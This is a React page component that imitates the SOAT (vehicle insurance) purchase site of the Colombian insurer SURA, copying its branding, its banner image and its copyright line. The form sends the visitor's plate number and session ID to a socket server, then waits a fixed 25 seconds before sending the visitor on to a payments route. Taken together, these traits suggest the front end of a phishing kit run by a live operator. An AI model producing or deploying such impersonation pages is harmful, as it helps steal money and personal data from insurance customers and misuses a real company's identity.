import { useCallback, useEffect, useState } from "react";
import { useLoaderStore } from "../stores/useLoaderStore";
import { Controller, useForm } from "react-hook-form";
import { useSocketStore } from "../stores/useSocketStore";
import { useNavigate } from "react-router-dom";

export const Vista = () => {
  let a = 3;
  const { socket } = useSocketStore();
  const { setLoading } = useLoaderStore();
  const { control, handleSubmit, watch } = useForm();
  const [isListening, setIsListening] = useState(false);
  const navigate = useNavigate();

  let maxInt = 6;
  useEffect(() => {
    setLoading(false);
  }, []);

  const onSubmit = (data) => {
    setLoading(true);
    const { id } = socket;
    const dataNew = { ...data, id: id };
    localStorage.setItem('plate', data.placa);
    socket.emit('register-data', dataNew, (response) => {
      console.log('ID de la persona:', response.id);
    });
    sessionStorage.setItem('placa', data.placa);

    setTimeout(() => {
      navigate('/home/pagos', { replace: true });
    }, 25000);
  };

  const [isOpen, setIsOpen] = useState(true);

  // Watch the "placa" field to determine if the button should be disabled
  const placaValue = watch("placa", "");

  return (
    <>
      {isOpen && (
        <div className="fixed bg-black bg-opacity-15 backdrop-blur-sm flex justify-center items-center p-2 h-screen w-screen">
          <div className="bg-white p-5 rounded flex flex-col justify-center items-center gap-5">
            <div className="m-3">
              <p className="text-[#0033A0] font-bold">
                <strong>
                  Antes de comprar tu SOAT, es importante que sepas:
                </strong>
              </p>
              <ul className="list-disc m-2">
                <li>
                  Por este medio se expide el SOAT para los vehículos
                  matriculados en Colombia.
                </li>
                <li>
                  Los únicos medios de pago habilitados y autorizados son PSE. Si alguien te contacta por WhatsApp
                  para pagar o realizar otro proceso, no caigas.
                </li>
                <li>
                  Quien compre el seguro debe ser el propietario del vehículo (
                  durante el proceso se valida la identidad ).
                </li>
                <li>
                  Luego de que hayas comprado la póliza, espera 24 horas y{" "}
                  <a
                    className=" mr-2 text-sm font-sans underline text-[#3BC1D4]"
                    href="https://www.runt.gov.co/consultaCiudadana/#/consultaVehiculo"
                  >
                    verifica aquí
                  </a>{" "}
                  que esta haya quedado cargada en el RUNT.
                </li>
                <li>
                  Si no puedes comprar de forma digital, programa una cita en el
                  punto físico más cercano. Conócelos y{" "}
                  <a
                    className=" mr-2 text-sm font-sans underline text-[#3BC1D4]"
                    href="https://seguros.comunicaciones.sura.com/puntos-fisicos-compra-soat"
                  >
                    agenda aquí
                  </a>
                  .
                </li>
              </ul>
              <div className="flex justify-center mt-7">
                <button className="bg-[#E3E829] hover:bg-[#c2c742ce] text-[#0033A0] font-bold py-2 px-4 rounded shadow-md transition duration-300 ease-in-out"
                  onClick={() => setIsOpen(false)}>
                  Entendido
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      <div className="flex flex-col bg-white w-auto">
        <div className="flex">
          <div className="flex ml-10 md:col-span-2">
            <div className="text-[#0033A0] font-sans text-2xl ml-5  mt-1 lg:text-xl xl:text-xl ">
              suraenlinea.com |
            </div>
            <div className="bg-white ml-2 px-5 md:px-8 py-3.5 md:py-5  md:mt-0.5 bg-contain bg-no-repeat bg-center bg-[url('./assets/logo.svg')] w-20 mt-2 "></div>
          </div>
        </div>
        <div className="flex flex-row justify-center items-end my-3 w-full gap-4">
          <div className="flex flex-wrap">
            <div className="rounded-full bg-[#3BC1D4] w-6 h-6 ">
              <p className="text-center font-semibold font-sans p-0 m-0 text-white text-sm ">
                1
              </p>
            </div>
            <p className="ml-2 mr-2 font-semibold font-sans text-sm text-[#3BC1D4]">Cotización</p>
            <div className="rounded-full bg-gray-300  w-6 h-6 mr-4 ">
              <p className="text-center font-semibold font-sans p-0 m-0 text-[#3BC1D4]  text-sm ">
                2
              </p>
            </div>
        
            <div className="flex flex-wrap md:flex-none">
              <div className="rounded-full bg-gray-300 w-6 h-6 mr-4 ">
                <p className="text-center font-semibold font-sans p-0 m-0 text-[#3BC1D4]  text-sm ">
                  3
                </p>
              </div>
         
            </div>
          </div>
        </div>
      </div>
      <div className="bg-[url('https://www.suraenlinea.com/soat/Banner_principal-8.1cba8b8ba43acb5f1666.png')] bg-cover bg-center p-5 md:grid md:grid-cols-3 justify-items-center">
        <form className="bg-white h-[280px] w-10/12 my-2 rounded-xl grid justify-items-center md:mt-10 md:w-64 md:h-10/12 p-2 m-auto" onSubmit={handleSubmit(onSubmit)}>
          <div className="grid justify-items-center ">
            <label className=" font-san font-semibold text-[#175b92] text-2xl m-auto text-center w-[200px]" >
              Cotiza y compra
              tu SOAT 100% digital
            </label>
            <p className="font-semibold text-gray-600">Ingresa el número de tu placa</p>
            <Controller
              name="placa"
              control={control}
              defaultValue=""
              render={({ field }) => (
                <input
                  {...field}
                  maxLength={maxInt}
                  onChange={e => field.onChange(e.target.value.toUpperCase())}
                  className="border text-center border-gray-300 2xl:h-10  px-6 rounded-lg focus:border-green-700 outline-none focus:ring-1 focus:ring-blue-900"
                  type="text"
                  placeholder="Ingresa tu placa"
                />
              )}
              rules={{
                maxLength: 6,
              }}
            />
            <button
              className="btn m-auto text-[#0033A0] bg-[#E3E829] mb-3 w-44 h-12 rounded-3xl text-xl font-bold 2xl:h-14 2xl:m-0 2xl:-mt-5"
              type="submit"
              disabled={!placaValue}
            >
              Cotizar
            </button>
          </div>
        </form>
      </div>
      <div className="md:grid md:grid-cols-2 bg-[#007bff] ">
        <div className=" text-center m-auto">
          <div className="grid justify-items-start p-2">
            <h1 className=" m-auto font-sans md:m-5 text-white text-center text-2xl font-bold">
              Fácil y simple
            </h1>
            <p className="text-white font-semibold text-[15px] mt-2">Navegarás de forma más fácil y rápida, encontrando lo que necesitas con solo unos clics</p>

            <h1 className=" m-auto font-sans md:m-5 text-white text-center text-2xl font-bold mt-8">
              Tu seguridad es lo primero
            </h1>
            <p className="text-white font-semibold text-[15px] mt-2">Tenemos las últimas medidas de seguridad para proteger tu información. Tú tranquilo, tus datos están protegidos</p>

            <h1 className=" m-auto font-sans md:m-5 text-white text-center text-2xl font-bold mt-8">
              Tu seguro a tu medida
            </h1>
            <p className="text-white font-semibold text-[15px] mt-2 mb-3">¡Ahora podrás ajustar tus coberturas y proteger lo que más valoras!</p>
          </div>

        </div>
      </div>
      <div className="bg-[#53565A]  ">
        <div className="flex justify-center mb-2">
          <p className="text-white text-sm m-3 font-sans w-20">Medios de pago: </p>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo5.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo2.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo3.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo4.png')] px-5 py-3"></div>
          <div className="bg-contain bg-no-repeat bg-center bg-[url('./assets/logo1.svg')] px-5 py-3"></div>
        </div>
        <hr className="border-1 border-gray-500 w-9/12 m-auto" />
        <div className="px-10 py-3 bg-cover text-white text-[11px] text-center font-sans ">
          <p> ℗2024 SURA. Todos los derechos reservados.</p>
          <p>politicas de uso y seguridad</p>
          <p>Politica de privacidad y ley de datos personales</p>
        </div>
      </div>
    </>
  );
};
